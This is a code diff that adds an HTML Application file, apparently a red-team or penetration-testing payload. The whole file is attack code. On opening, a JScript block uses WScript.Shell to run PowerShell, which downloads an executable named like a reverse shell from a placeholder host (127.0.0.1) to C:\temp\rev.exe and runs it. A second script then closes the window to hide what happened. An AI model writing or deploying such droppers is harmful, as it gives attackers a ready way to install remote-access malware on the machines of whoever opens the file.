@@ -1,0 +1,13 @@
+<html>
+    <head>
+        <script language="JScript">
+            var shell = new ActiveXObject("WScript.Shell");
+            var res = shell.Run("powershell iwr -uri http://127.0.0.1/xorapishell.exe -outfile C:\\temp\\rev.exe; C:\\temp\\rev.exe");
+        </script>
+    </head>
+    <body>
+        <script language="JScript">
+            self.close();
+        </script>
+    </body>
+</html>
